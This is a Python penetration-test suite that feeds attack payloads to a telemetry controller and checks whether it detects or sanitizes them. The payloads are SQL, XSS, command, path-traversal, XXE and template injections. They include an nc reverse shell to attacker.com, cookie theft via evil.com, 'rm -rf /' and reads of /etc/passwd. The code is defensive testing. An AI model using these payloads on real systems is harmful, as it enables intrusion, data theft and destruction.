#!/usr/bin/env python3
"""
Security Penetration Testing Suite
=================================

Comprehensive security testing suite for SOC-grade deployment.
Tests SCAFAD's resilience against real-world attack vectors,
input validation, and security controls.

Security Test Categories:
- Input Validation and Sanitization
- Injection Attack Resistance  
- Authentication and Authorization
- Data Leakage Prevention
- Denial of Service Protection
- Configuration Security
- Cryptographic Implementation
- API Security
- Error Handling Security
- Supply Chain Security

Compliance Standards:
- OWASP Top 10
- NIST Cybersecurity Framework
- ISO 27001/27002
- CIS Critical Security Controls
"""

import asyncio
import time
import json
import uuid
import base64
import hashlib
import secrets
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum
import re

# SCAFAD imports
from app_main import Layer0_AdaptiveTelemetryController
from app_config import ScafadConfig
from utils.validators import InputValidator, SecurityError, ValidationSeverity
from utils.helpers import safe_json_parse, calculate_hash, constant_time_compare


class SecurityTestSeverity(Enum):
    """Security test severity levels"""
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


class AttackCategory(Enum):
    """Attack categories for penetration testing"""
    INJECTION = "INJECTION"
    BROKEN_AUTHENTICATION = "BROKEN_AUTHENTICATION"
    SENSITIVE_DATA_EXPOSURE = "SENSITIVE_DATA_EXPOSURE"
    XML_EXTERNAL_ENTITIES = "XML_EXTERNAL_ENTITIES"
    BROKEN_ACCESS_CONTROL = "BROKEN_ACCESS_CONTROL"
    SECURITY_MISCONFIGURATION = "SECURITY_MISCONFIGURATION"
    CROSS_SITE_SCRIPTING = "CROSS_SITE_SCRIPTING"
    INSECURE_DESERIALIZATION = "INSECURE_DESERIALIZATION"
    VULNERABLE_COMPONENTS = "VULNERABLE_COMPONENTS"
    INSUFFICIENT_LOGGING = "INSUFFICIENT_LOGGING"


@dataclass
class SecurityTestResult:
    """Individual security test result"""
    test_id: str
    test_name: str
    category: AttackCategory
    severity: SecurityTestSeverity
    passed: bool
    execution_time: float
    vulnerability_found: bool
    attack_success: bool
    evidence: List[str] = field(default_factory=list)
    remediation: str = ""
    details: Dict[str, Any] = field(default_factory=dict)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            'test_id': self.test_id,
            'test_name': self.test_name,
            'category': self.category.value,
            'severity': self.severity.value,
            'passed': self.passed,
            'execution_time': self.execution_time,
            'vulnerability_found': self.vulnerability_found,
            'attack_success': self.attack_success,
            'evidence': self.evidence,
            'remediation': self.remediation,
            'details': self.details
        }


class SecurityPenetrationTestSuite:
    """Comprehensive security penetration test suite"""
    
    def __init__(self):
        self.config = ScafadConfig()
        self.controller = Layer0_AdaptiveTelemetryController(self.config)
        self.validator = InputValidator()
        
        # Attack payloads database
        self.attack_payloads = self._initialize_attack_payloads()
    
    def _initialize_attack_payloads(self) -> Dict[str, List[str]]:
        """Initialize comprehensive attack payload database"""
        return {
            'sql_injection': [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "'; INSERT INTO users (username, password) VALUES ('hacker', 'pwned'); --",
                "' UNION SELECT username, password FROM admin_users --",
                "'; EXEC xp_cmdshell('net user hacker password123 /add'); --",
                "' OR 1=1 AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --"
            ],
            'nosql_injection': [
                "{'$ne': null}",
                "{'$gt': ''}",
                "{'$where': 'this.password.length > 0'}",
                "{'$regex': '.*'}",
                "{'$or': [{'username': 'admin'}, {'username': 'root'}]}"
            ],
            'xss_payloads': [
                "<script>alert('XSS')</script>",
                "<img src='x' onerror='alert(document.cookie)'>",
                "javascript:alert('XSS')",
                "<svg onload='alert(1)'>",
                "<iframe src='javascript:alert(1)'></iframe>",
                "'><script>fetch('http://evil.com?cookie='+document.cookie)</script>"
            ],
            'command_injection': [
                "; cat /etc/passwd",
                "&& net user",
                "| whoami",
                "; rm -rf /",
                "&& dir C:\\",
                "`id`",
                "$(whoami)",
                "; nc -e /bin/sh attacker.com 4444"
            ],
            'path_traversal': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "file:///etc/passwd",
                "file:///C:/windows/system.ini"
            ],
            'ldap_injection': [
                "*)(uid=*",
                "*)(|(uid=*))",
                "admin)(&(password=*))",
                "*))%00",
                ")(cn=*)(password=*"
            ],
            'xxe_payloads': [
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/hostname">]><data>&file;</data>',
                '<!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;]><test></test>'
            ],
            'deserialization_payloads': [
                'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAEY2FsY3EAfgABdAAEZXhlY3EAfgABdAAtamF2YSAtY3AgL3RtcC9leGVjdXRlLmNsYXNzIC1Eb3MgL3RtcC9ldmlsLnNoeDhwdAAhcG9wZW4oJ2NhbGMnKS5yZWFkKCkABHRlc3RzcgAOamF2YS5sYW5nLkNsYXNzAAAAAAAAAAAAGAAFdAAEbmFtZXEAfgAKdAAPamF2YS5sYW5nLlN0cmluZ3hyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cA==',
                'aced00057372002e6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00044c697374740010...'
            ],
            'template_injection': [
                "{{7*7}}",
                "${7*7}",
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                "${T(java.lang.Runtime).getRuntime().exec('calc')}",
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}"
            ]
        }
    
    async def test_sql_injection_resistance(self) -> SecurityTestResult:
        """Test SQL injection attack resistance"""
        test_start = time.time()
        test_id = "SEC_SQL_001"
        
        vulnerabilities_found = []
        attack_attempts = 0
        successful_attacks = 0
        
        context = type('Context', (), {
            'aws_request_id': 'security_test_sql',
            'function_name': 'scafad_security_test'
        })()
        
        try:
            for payload in self.attack_payloads['sql_injection']:
                attack_attempts += 1
                
                # Test various injection points
                injection_points = [
                    {"user_input": payload},
                    {"search_query": payload},
                    {"filter": payload},
                    {"username": payload, "password": "test"},
                    {"id": payload}
                ]
                
                for injection_point in injection_points:
                    test_event = {
                        "event_type": "user_input",
                        "source": "web_interface",
                        **injection_point,
                        "correlation_id": f"sql_injection_test_{uuid.uuid4()}"
                    }
                    
                    try:
                        # Process event - should be blocked/sanitized
                        result = await self.controller.process_telemetry_event(test_event, context)
                        
                        # Check if injection was detected
                        security_analysis = result.get('security_analysis', {})
                        injection_detected = security_analysis.get('sql_injection_detected', False)
                        payload_sanitized = security_analysis.get('payload_sanitized', False)
                        
                        # Check for signs of successful injection
                        telemetry_record = result.get('telemetry_record', {})
                        anomaly_detected = telemetry_record.get('anomaly_type') != 'BENIGN'
                        
                        if not (injection_detected or payload_sanitized or anomaly_detected):
                            # Potential vulnerability - payload not caught
                            vulnerabilities_found.append({
                                'payload': payload,
                                'injection_point': list(injection_point.keys())[0],
                                'result': 'not_detected'
                            })
                        
                        # Check response for error messages that might indicate successful injection
                        response_data = str(result)
                        if any(error in response_data.lower() for error in ['sql syntax', 'database error', 'mysql', 'postgres']):
                            successful_attacks += 1
                            vulnerabilities_found.append({
                                'payload': payload,
                                'injection_point': list(injection_point.keys())[0],
                                'result': 'error_disclosure'
                            })
                        
                    except SecurityError:
                        # Good - security error means injection was caught
                        continue
                    except Exception as e:
                        # Check if exception reveals database information
                        error_msg = str(e).lower()
                        if any(db in error_msg for db in ['sql', 'database', 'mysql', 'postgres', 'sqlite']):
                            successful_attacks += 1
                            vulnerabilities_found.append({
                                'payload': payload,
                                'exception': str(e),
                                'result': 'exception_disclosure'
                            })
            
            execution_time = time.time() - test_start
            vulnerability_found = len(vulnerabilities_found) > 0
            attack_success_rate = successful_attacks / attack_attempts if attack_attempts > 0 else 0
            
            # Test passes if no vulnerabilities found and attack success rate < 5%
            test_passed = not vulnerability_found and attack_success_rate < 0.05
            
            evidence = [
                f"Attack attempts: {attack_attempts}",
                f"Successful attacks: {successful_attacks}",
                f"Attack success rate: {attack_success_rate:.2%}",
                f"Vulnerabilities found: {len(vulnerabilities_found)}"
            ]
            
            if vulnerabilities_found:
                evidence.extend([f"Vulnerability: {vuln}" for vuln in vulnerabilities_found[:3]])
            
            return SecurityTestResult(
                test_id=test_id,
                test_name="SQL Injection Resistance",
                category=AttackCategory.INJECTION,
                severity=SecurityTestSeverity.CRITICAL,
                passed=test_passed,
                execution_time=execution_time,
                vulnerability_found=vulnerability_found,
                attack_success=successful_attacks > 0,
                evidence=evidence,
                remediation="Implement parameterized queries and input validation" if vulnerability_found else "",
                details={
                    'attack_attempts': attack_attempts,
                    'successful_attacks': successful_attacks,
                    'vulnerabilities': vulnerabilities_found
                }
            )
            
        except Exception as e:
            return SecurityTestResult(
                test_id=test_id,
                test_name="SQL Injection Resistance",
                category=AttackCategory.INJECTION,
                severity=SecurityTestSeverity.CRITICAL,
                passed=False,
                execution_time=time.time() - test_start,
                vulnerability_found=True,
                attack_success=True,
                evidence=[f"Test exception: {str(e)}"],
                remediation="Fix testing framework and implement SQL injection protection",
                details={'error': str(e)}
            )
    
    async def test_xss_prevention(self) -> SecurityTestResult:
        """Test Cross-Site Scripting (XSS) prevention"""
        test_start = time.time()
        test_id = "SEC_XSS_001"
        
        vulnerabilities_found = []
        attack_attempts = 0
        successful_attacks = 0
        
        context = type('Context', (), {
            'aws_request_id': 'security_test_xss',
            'function_name': 'scafad_security_test'
        })()
        
        try:
            for payload in self.attack_payloads['xss_payloads']:
                attack_attempts += 1
                
                test_event = {
                    "event_type": "web_input",
                    "user_content": payload,
                    "comment": payload,
                    "search_term": payload,
                    "username": payload,
                    "correlation_id": f"xss_test_{uuid.uuid4()}"
                }
                
                try:
                    result = await self.controller.process_telemetry_event(test_event, context)
                    
                    # Check if XSS was detected and sanitized
                    security_analysis = result.get('security_analysis', {})
                    xss_detected = security_analysis.get('xss_detected', False)
                    content_sanitized = security_analysis.get('content_sanitized', False)
                    
                    # Check telemetry for anomaly detection
                    telemetry_record = result.get('telemetry_record', {})
                    anomaly_detected = telemetry_record.get('anomaly_type') != 'BENIGN'
                    
                    # Check if script tags or javascript: URLs are present in output
                    output_data = json.dumps(result, default=str)
                    if any(dangerous in output_data.lower() for dangerous in ['<script', 'javascript:', 'onerror=', 'onload=']):
                        successful_attacks += 1
                        vulnerabilities_found.append({
                            'payload': payload,
                            'result': 'script_tags_in_output'
                        })
                    
                    if not (xss_detected or content_sanitized or anomaly_detected):
                        vulnerabilities_found.append({
                            'payload': payload,
                            'result': 'not_detected'
                        })
                    
                except Exception as e:
                    # Check if error message contains unsanitized input
                    error_msg = str(e)
                    if any(dangerous in error_msg for dangerous in ['<script', 'javascript:', 'alert(']):
                        successful_attacks += 1
                        vulnerabilities_found.append({
                            'payload': payload,
                            'exception': error_msg,
                            'result': 'error_reflection'
                        })
            
            execution_time = time.time() - test_start
            vulnerability_found = len(vulnerabilities_found) > 0
            attack_success_rate = successful_attacks / attack_attempts if attack_attempts > 0 else 0
            
            test_passed = not vulnerability_found and attack_success_rate == 0
            
            evidence = [
                f"XSS attack attempts: {attack_attempts}",
                f"Successful XSS attacks: {successful_attacks}",
                f"Vulnerabilities found: {len(vulnerabilities_found)}"
            ]
            
            return SecurityTestResult(
                test_id=test_id,
                test_name="XSS Prevention",
                category=AttackCategory.CROSS_SITE_SCRIPTING,
                severity=SecurityTestSeverity.HIGH,
                passed=test_passed,
                execution_time=execution_time,
                vulnerability_found=vulnerability_found,
                attack_success=successful_attacks > 0,
                evidence=evidence,
                remediation="Implement input sanitization and output encoding" if vulnerability_found else "",
                details={
                    'attack_attempts': attack_attempts,
                    'successful_attacks': successful_attacks,
                    'vulnerabilities': vulnerabilities_found
                }
            )
            
        except Exception as e:
            return SecurityTestResult(
                test_id=test_id,
                test_name="XSS Prevention",
                category=AttackCategory.CROSS_SITE_SCRIPTING,
                severity=SecurityTestSeverity.HIGH,
                passed=False,
                execution_time=time.time() - test_start,
                vulnerability_found=True,
                attack_success=True,
                evidence=[f"Test exception: {str(e)}"],
                remediation="Fix XSS testing framework and implement prevention",
                details={'error': str(e)}
            )
    
    async def test_command_injection_prevention(self) -> SecurityTestResult:
        """Test command injection prevention"""
        test_start = time.time()
        test_id = "SEC_CMD_001"
        
        vulnerabilities_found = []
        attack_attempts = 0
        successful_attacks = 0
        
        context = type('Context', (), {
            'aws_request_id': 'security_test_cmd',
            'function_name': 'scafad_security_test'
        })()
        
        try:
            for payload in self.attack_payloads['command_injection']:
                attack_attempts += 1
                
                # Test command injection in various fields
                test_cases = [
                    {"filename": payload},
                    {"process_name": payload},
                    {"command_args": payload},
                    {"script_content": payload},
                    {"system_call": payload}
                ]
                
                for test_case in test_cases:
                    test_event = {
                        "event_type": "system_command",
                        "source": "admin_interface",
                        **test_case,
                        "correlation_id": f"cmd_injection_test_{uuid.uuid4()}"
                    }
                    
                    try:
                        result = await self.controller.process_telemetry_event(test_event, context)
                        
                        # Check if command injection was detected
                        security_analysis = result.get('security_analysis', {})
                        cmd_injection_detected = security_analysis.get('command_injection_detected', False)
                        payload_sanitized = security_analysis.get('payload_sanitized', False)
                        
                        # Check for command execution evidence in response
                        response_data = str(result)
                        command_indicators = ['root:x:0:0', 'uid=', 'gid=', 'Administrator', 'SYSTEM', '/bin/sh', 'cmd.exe']
                        if any(indicator in response_data for indicator in command_indicators):
                            successful_attacks += 1
                            vulnerabilities_found.append({
                                'payload': payload,
                                'field': list(test_case.keys())[0],
                                'result': 'command_execution_evidence'
                            })
                        
                        if not (cmd_injection_detected or payload_sanitized):
                            vulnerabilities_found.append({
                                'payload': payload,
                                'field': list(test_case.keys())[0],
                                'result': 'not_detected'
                            })
                        
                    except Exception as e:
                        error_msg = str(e)
                        # Check for system command errors that might indicate execution
                        if any(cmd_error in error_msg.lower() for cmd_error in ['permission denied', 'command not found', 'access denied']):
                            successful_attacks += 1
                            vulnerabilities_found.append({
                                'payload': payload,
                                'exception': error_msg,
                                'result': 'system_error'
                            })
            
            execution_time = time.time() - test_start
            vulnerability_found = len(vulnerabilities_found) > 0
            attack_success_rate = successful_attacks / attack_attempts if attack_attempts > 0 else 0
            
            test_passed = not vulnerability_found and attack_success_rate == 0
            
            evidence = [
                f"Command injection attempts: {attack_attempts}",
                f"Successful attacks: {successful_attacks}",
                f"Attack success rate: {attack_success_rate:.2%}",
                f"Vulnerabilities found: {len(vulnerabilities_found)}"
            ]
            
            return SecurityTestResult(
                test_id=test_id,
                test_name="Command Injection Prevention",
                category=AttackCategory.INJECTION,
                severity=SecurityTestSeverity.CRITICAL,
                passed=test_passed,
                execution_time=execution_time,
                vulnerability_found=vulnerability_found,
                attack_success=successful_attacks > 0,
                evidence=evidence,
                remediation="Implement input validation and avoid system command execution" if vulnerability_found else "",
                details={
                    'attack_attempts': attack_attempts,
                    'successful_attacks': successful_attacks,
                    'vulnerabilities': vulnerabilities_found
                }
            )
            
        except Exception as e:
            return SecurityTestResult(
                test_id=test_id,
                test_name="Command Injection Prevention",
                category=AttackCategory.INJECTION,
                severity=SecurityTestSeverity.CRITICAL,
                passed=False,
                execution_time=time.time() - test_start,
                vulnerability_found=True,
                attack_success=True,
                evidence=[f"Test exception: {str(e)}"],
                remediation="Fix command injection testing and implement prevention",
                details={'error': str(e)}
            )
    
    async def test_input_validation_bypass(self) -> SecurityTestResult:
        """Test comprehensive input validation bypass attempts"""
        test_start = time.time()
        test_id = "SEC_VAL_001"
        
        bypass_attempts = []
        successful_bypasses = 0
        total_attempts = 0
        
        context = type('Context', (), {
            'aws_request_id': 'security_test_validation',
            'function_name': 'scafad_security_test'
        })()
        
        # Various bypass techniques
        bypass_techniques = [
            # Size limit bypass
            {"technique": "oversized_input", "payload": "A" * 100000},
            
            # Encoding bypass
            {"technique": "url_encoding", "payload": "%3Cscript%3Ealert%281%29%3C%2Fscript%3E"},
            {"technique": "double_encoding", "payload": "%253Cscript%253E"},
            {"technique": "unicode_encoding", "payload": "\\u003cscript\\u003e"},
            
            # Null byte injection
            {"technique": "null_byte", "payload": "legitimate\\x00<script>alert(1)</script>"},
            
            # Case variation
            {"technique": "case_variation", "payload": "<ScRiPt>AlErT(1)</ScRiPt>"},
            
            # Fragmentation
            {"technique": "fragmented_payload", "payload": "<scr" + "ipt>ale" + "rt(1)</scr" + "ipt>"},
            
            # CRLF injection
            {"technique": "crlf_injection", "payload": "test\\r\\nSet-Cookie: admin=true"},
            
            # Path traversal variations
            {"technique": "path_traversal", "payload": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"},
            
            # XXE attempt
            {"technique": "xxe", "payload": '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY test "test">]><test>&test;</test>'},
            
            # Deserialization
            {"technique": "serialization", "payload": "O:8:\"stdClass\":1:{s:4:\"exec\";s:4:\"calc\";}"},
        ]
        
        try:
            for technique_info in bypass_techniques:
                total_attempts += 1
                technique = technique_info["technique"]
                payload = technique_info["payload"]
                
                test_event = {
                    "event_type": "input_validation_test",
                    "technique": technique,
                    "user_input": payload,
                    "data": payload,
                    "content": payload,
                    "correlation_id": f"validation_bypass_{uuid.uuid4()}"
                }
                
                try:
                    # Test with validator first
                    sanitized_event, validation_issues = self.validator.validate_and_sanitize(test_event)
                    
                    critical_issues = [issue for issue in validation_issues 
                                     if issue.severity == ValidationSeverity.CRITICAL]
                    
                    if not critical_issues:
                        # No critical issues found - potential bypass
                        result = await self.controller.process_telemetry_event(sanitized_event, context)
                        
                        # Check if the payload survived sanitization
                        result_str = json.dumps(result, default=str)
                        if payload in result_str or any(dangerous in result_str.lower() 
                                                       for dangerous in ['<script', 'javascript:', 'alert(']):
                            successful_bypasses += 1
                            bypass_attempts.append({
                                'technique': technique,
                                'payload': payload[:100] + "..." if len(payload) > 100 else payload,
                                'result': 'bypass_successful'
                            })
                    
                except SecurityError:
                    # Good - security error means attack was blocked
                    continue
                except Exception as e:
                    # Check if exception contains unsanitized payload
                    if payload[:50] in str(e):
                        successful_bypasses += 1
                        bypass_attempts.append({
                            'technique': technique,
                            'exception': str(e)[:200],
                            'result': 'payload_in_exception'
                        })
            
            execution_time = time.time() - test_start
            vulnerability_found = len(bypass_attempts) > 0
            bypass_rate = successful_bypasses / total_attempts if total_attempts > 0 else 0
            
            test_passed = not vulnerability_found and bypass_rate == 0
            
            evidence = [
                f"Bypass attempts: {total_attempts}",
                f"Successful bypasses: {successful_bypasses}",
                f"Bypass rate: {bypass_rate:.2%}",
                f"Validation bypasses found: {len(bypass_attempts)}"
            ]
            
            if bypass_attempts:
                evidence.extend([f"Bypass: {bypass['technique']}" for bypass in bypass_attempts[:3]])
            
            return SecurityTestResult(
                test_id=test_id,
                test_name="Input Validation Bypass",
                category=AttackCategory.SECURITY_MISCONFIGURATION,
                severity=SecurityTestSeverity.HIGH,
                passed=test_passed,
                execution_time=execution_time,
                vulnerability_found=vulnerability_found,
                attack_success=successful_bypasses > 0,
                evidence=evidence,
                remediation="Strengthen input validation and add additional sanitization layers" if vulnerability_found else "",
                details={
                    'total_attempts': total_attempts,
                    'successful_bypasses': successful_bypasses,
                    'bypass_attempts': bypass_attempts
                }
            )
            
        except Exception as e:
            return SecurityTestResult(
                test_id=test_id,
                test_name="Input Validation Bypass",
                category=AttackCategory.SECURITY_MISCONFIGURATION,
                severity=SecurityTestSeverity.HIGH,
                passed=False,
                execution_time=time.time() - test_start,
                vulnerability_found=True,
                attack_success=True,
                evidence=[f"Test exception: {str(e)}"],
                remediation="Fix input validation testing framework",
                details={'error': str(e)}
            )
    
    async def test_denial_of_service_protection(self) -> SecurityTestResult:
        """Test denial of service protection mechanisms"""
        test_start = time.time()
        test_id = "SEC_DOS_001"
        
        dos_vulnerabilities = []
        attack_attempts = 0
        successful_attacks = 0
        
        context = type('Context', (), {
            'aws_request_id': 'security_test_dos',
            'function_name': 'scafad_security_test'
        })()
        
        try:
            # Test various DoS attack vectors
            dos_tests = [
                # Resource exhaustion
                {"type": "large_payload", "data": "x" * 10000000},  # 10MB payload
                {"type": "deep_recursion", "data": self._create_deeply_nested_object(100)},
                {"type": "large_array", "data": list(range(100000))},
                
                # Computational DoS
                {"type": "regex_dos", "data": "a" * 10000 + "X"},
                {"type": "hash_collision", "data": {str(i): "collision" for i in range(10000)}},
                
                # Memory exhaustion
                {"type": "memory_bomb", "data": {"bomb": ["x" * 1000] * 1000}},
            ]
            
            for dos_test in dos_tests:
                attack_attempts += 1
                test_type = dos_test["type"]
                
                test_event = {
                    "event_type": "dos_test",
                    "attack_type": test_type,
                    "payload": dos_test["data"],
                    "correlation_id": f"dos_test_{uuid.uuid4()}"
                }
                
                processing_start = time.time()
                
                try:
                    # Set reasonable timeout
                    result = await asyncio.wait_for(
                        self.controller.process_telemetry_event(test_event, context),
                        timeout=5.0  # 5 second timeout
                    )
                    
                    processing_time = time.time() - processing_start
                    
                    # Check if processing took too long (DoS successful)
                    if processing_time > 3.0:  # More than 3 seconds
                        successful_attacks += 1
                        dos_vulnerabilities.append({
                            'attack_type': test_type,
                            'processing_time': processing_time,
                            'result': 'slow_processing'
                        })
                    
                    # Check memory usage if possible
                    try:
                        import psutil
                        process = psutil.Process()
                        memory_mb = process.memory_info().rss / 1024 / 1024
                        if memory_mb > 500:  # More than 500MB
                            dos_vulnerabilities.append({
                                'attack_type': test_type,
                                'memory_usage_mb': memory_mb,
                                'result': 'high_memory_usage'
                            })
                    except ImportError:
                        pass
                    
                except asyncio.TimeoutError:
                    # Timeout indicates potential DoS vulnerability
                    successful_attacks += 1
                    dos_vulnerabilities.append({
                        'attack_type': test_type,
                        'result': 'timeout'
                    })
                
                except Exception as e:
                    # Check if error indicates resource exhaustion
                    error_msg = str(e).lower()
                    if any(indicator in error_msg for indicator in ['memory', 'timeout', 'recursion', 'stack overflow']):
                        successful_attacks += 1
                        dos_vulnerabilities.append({
                            'attack_type': test_type,
                            'exception': str(e)[:200],
                            'result': 'resource_exhaustion'
                        })
            
            execution_time = time.time() - test_start
            vulnerability_found = len(dos_vulnerabilities) > 0
            attack_success_rate = successful_attacks / attack_attempts if attack_attempts > 0 else 0
            
            test_passed = not vulnerability_found and attack_success_rate == 0
            
            evidence = [
                f"DoS attack attempts: {attack_attempts}",
                f"Successful DoS attacks: {successful_attacks}",
                f"Attack success rate: {attack_success_rate:.2%}",
                f"DoS vulnerabilities found: {len(dos_vulnerabilities)}"
            ]
            
            if dos_vulnerabilities:
                evidence.extend([f"DoS vulnerability: {vuln['attack_type']}" for vuln in dos_vulnerabilities[:3]])
            
            return SecurityTestResult(
                test_id=test_id,
                test_name="Denial of Service Protection",
                category=AttackCategory.SECURITY_MISCONFIGURATION,
                severity=SecurityTestSeverity.HIGH,
                passed=test_passed,
                execution_time=execution_time,
                vulnerability_found=vulnerability_found,
                attack_success=successful_attacks > 0,
                evidence=evidence,
                remediation="Implement rate limiting, input size limits, and timeout controls" if vulnerability_found else "",
                details={
                    'attack_attempts': attack_attempts,
                    'successful_attacks': successful_attacks,
                    'dos_vulnerabilities': dos_vulnerabilities
                }
            )
            
        except Exception as e:
            return SecurityTestResult(
                test_id=test_id,
                test_name="Denial of Service Protection",
                category=AttackCategory.SECURITY_MISCONFIGURATION,
                severity=SecurityTestSeverity.HIGH,
                passed=False,
                execution_time=time.time() - test_start,
                vulnerability_found=True,
                attack_success=True,
                evidence=[f"Test exception: {str(e)}"],
                remediation="Fix DoS testing framework and implement protection",
                details={'error': str(e)}
            )
    
    def _create_deeply_nested_object(self, depth: int) -> Dict[str, Any]:
        """Create deeply nested object for recursion DoS test"""
        if depth <= 0:
            return {"end": True}
        return {"level": depth, "nested": self._create_deeply_nested_object(depth - 1)}
    
    async def test_information_disclosure(self) -> SecurityTestResult:
        """Test for information disclosure vulnerabilities"""
        test_start = time.time()
        test_id = "SEC_INFO_001"
        
        disclosures_found = []
        test_attempts = 0
        
        context = type('Context', (), {
            'aws_request_id': 'security_test_info',
            'function_name': 'scafad_security_test'
        })()
        
        try:
            # Test for various information disclosure scenarios
            test_scenarios = [
                # Error message disclosure
                {"type": "invalid_json", "payload": '{"invalid": json}'},
                {"type": "stack_trace", "payload": {"cause_error": True}},
                
                # Debug information
                {"type": "debug_headers", "payload": {"X-Debug": "true"}},
                {"type": "verbose_mode", "payload": {"verbose": True}},
                
                # System information
                {"type": "system_info", "payload": {"get_system_info": True}},
                {"type": "version_info", "payload": {"get_version": True}},
                
                # Configuration disclosure
                {"type": "config_leak", "payload": {"show_config": True}},
            ]
            
            for scenario in test_scenarios:
                test_attempts += 1
                scenario_type = scenario["type"]
                
                test_event = {
                    "event_type": "info_disclosure_test",
                    "scenario": scenario_type,
                    **scenario["payload"],
                    "correlation_id": f"info_disclosure_{uuid.uuid4()}"
                }
                
                try:
                    result = await self.controller.process_telemetry_event(test_event, context)
                    
                    # Analyze response for sensitive information
                    response_str = json.dumps(result, default=str)
                    
                    # Check for sensitive patterns
                    sensitive_patterns = [
                        # System paths
                        r'/etc/passwd',
                        r'C:\\Windows',
                        r'/usr/bin',
                        
                        # Error traces
                        r'Traceback \(most recent call last\):',
                        r'at java\.',
                        r'Exception in thread',
                        
                        # Database info
                        r'mysql://.*@',
                        r'postgresql://.*@',
                        r'mongodb://.*@',
                        
                        # API keys/secrets (patterns)
                        r'[A-Za-z0-9]{32,}',  # Potential API keys
                        r'sk-[A-Za-z0-9]{20,}',  # OpenAI style keys
                        
                        # System information
                        r'version.*\d+\.\d+\.\d+',
                        r'build.*\d+',
                        r'hostname.*:',
                        
                        # Internal IPs
                        r'192\.168\.\d+\.\d+',
                        r'10\.\d+\.\d+\.\d+',
                        r'172\.(1[6-9]|2[0-9]|3[0-1])\.\d+\.\d+',
                    ]
                    
                    for pattern in sensitive_patterns:
                        matches = re.findall(pattern, response_str, re.IGNORECASE)
                        if matches:
                            disclosures_found.append({
                                'scenario': scenario_type,
                                'pattern': pattern,
                                'matches': matches[:3],  # Limit to first 3 matches
                                'disclosure_type': 'pattern_match'
                            })
                    
                    # Check for overly verbose error messages
                    if len(response_str) > 5000:  # Very long response might contain debug info
                        disclosures_found.append({
                            'scenario': scenario_type,
                            'response_length': len(response_str),
                            'disclosure_type': 'verbose_response'
                        })
                    
                except Exception as e:
                    # Analyze exception for information disclosure
                    error_str = str(e)
                    
                    # Check if error message reveals internal paths or structure
                    if any(sensitive in error_str for sensitive in ['/home/', '/var/', 'C:\\', 'Exception in']):
                        disclosures_found.append({
                            'scenario': scenario_type,
                            'exception': error_str[:500],  # Limit length
                            'disclosure_type': 'exception_disclosure'
                        })
            
            execution_time = time.time() - test_start
            vulnerability_found = len(disclosures_found) > 0
            
            test_passed = not vulnerability_found
            
            evidence = [
                f"Information disclosure tests: {test_attempts}",
                f"Disclosures found: {len(disclosures_found)}"
            ]
            
            if disclosures_found:
                evidence.extend([f"Disclosure: {disc['scenario']} - {disc['disclosure_type']}" 
                               for disc in disclosures_found[:3]])
            
            return SecurityTestResult(
                test_id=test_id,
                test_name="Information Disclosure",
                category=AttackCategory.SENSITIVE_DATA_EXPOSURE,
                severity=SecurityTestSeverity.MEDIUM,
                passed=test_passed,
                execution_time=execution_time,
                vulnerability_found=vulnerability_found,
                attack_success=vulnerability_found,
                evidence=evidence,
                remediation="Implement proper error handling and remove debug information from responses" if vulnerability_found else "",
                details={
                    'test_attempts': test_attempts,
                    'disclosures_found': disclosures_found
                }
            )
            
        except Exception as e:
            return SecurityTestResult(
                test_id=test_id,
                test_name="Information Disclosure",
                category=AttackCategory.SENSITIVE_DATA_EXPOSURE,
                severity=SecurityTestSeverity.MEDIUM,
                passed=False,
                execution_time=time.time() - test_start,
                vulnerability_found=True,
                attack_success=True,
                evidence=[f"Test exception: {str(e)}"],
                remediation="Fix information disclosure testing framework",
                details={'error': str(e)}
            )
    
    async def run_comprehensive_security_tests(self) -> Dict[str, Any]:
        """Run comprehensive security penetration tests"""
        print("🛡️  Security Penetration Testing Suite")
        print("=" * 50)
        
        test_start_time = time.time()
        
        # Define test suite
        security_tests = [
            ("SQL Injection Resistance", self.test_sql_injection_resistance),
            ("XSS Prevention", self.test_xss_prevention),
            ("Command Injection Prevention", self.test_command_injection_prevention),
            ("Input Validation Bypass", self.test_input_validation_bypass),
            ("Denial of Service Protection", self.test_denial_of_service_protection),
            ("Information Disclosure", self.test_information_disclosure),
        ]
        
        all_results = []
        
        # Execute security tests
        for test_name, test_method in security_tests:
            print(f"\n🔍 Running {test_name}...")
            
            try:
                result = await test_method()
                all_results.append(result)
                
                status = "✅ SECURE" if result.passed else "❌ VULNERABLE"
                vuln_indicator = " 🚨" if result.vulnerability_found else ""
                
                print(f"   {status}{vuln_indicator} - {result.execution_time:.2f}s")
                
                if result.vulnerability_found:
                    print(f"   Vulnerabilities: {len(result.details.get('vulnerabilities', result.details.get('bypass_attempts', result.details.get('dos_vulnerabilities', []))))}")
                
            except Exception as e:
                print(f"   ❌ ERROR - {str(e)}")
                all_results.append(SecurityTestResult(
                    test_id=f"SEC_ERR_{len(all_results)}",
                    test_name=test_name,
                    category=AttackCategory.SECURITY_MISCONFIGURATION,
                    severity=SecurityTestSeverity.CRITICAL,
                    passed=False,
                    execution_time=0.0,
                    vulnerability_found=True,
                    attack_success=True,
